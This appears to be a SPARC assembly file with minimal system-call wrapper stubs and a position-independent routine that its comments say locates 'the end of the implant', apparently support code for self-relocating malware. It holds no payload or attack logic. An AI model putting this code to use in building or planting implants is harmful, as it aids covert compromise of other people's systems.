#include <syscall.h>
	!
	! System calls rewritten as a "jump table"
	! to get absolute minimum instruction count.
	!
	.seg "text"
	.global _read
	.global _write
	.global _close
	.global _open
	.global _fstat
	.global _lseek
	.global _chdir
	!
	! note clever use of delay slots
	!
_read:
	ba do_syscall
	mov SYS_read, %g1
	!
_write:
	ba do_syscall
	mov SYS_write, %g1
	!
_close:
	ba do_syscall
	mov SYS_close, %g1
	!
_open:
	ba do_syscall
	mov SYS_open, %g1
	!
_fstat:
	ba do_syscall
	mov SYS_fstat, %g1
	!
_chdir:
	ba do_syscall
	mov SYS_chdir, %g1
	!
_lseek:
	mov SYS_lseek, %g1
	! note fall through to the trap instruction

do_syscall:
	ta 0
	bcc no_error
	! error occurred on a system call
	nop
	mov -1, %o0	! delay slot, return -1
no_error:
	retl
	nop

	!
	! a position independant way to find
	! the end of the implant.  "endtext"
	! points to a fixed location.
	! assumes that flow of control "branched" to _end_text
	.global _end_text
_end_text:
	mov %o7, %o5 ! move old pc into safe location
	call crud
	nop  ! delay slot
crud:
	add %o7, 16, %o0
	jmpl %o5 + 8, %g0 
	nop  ! delay slot
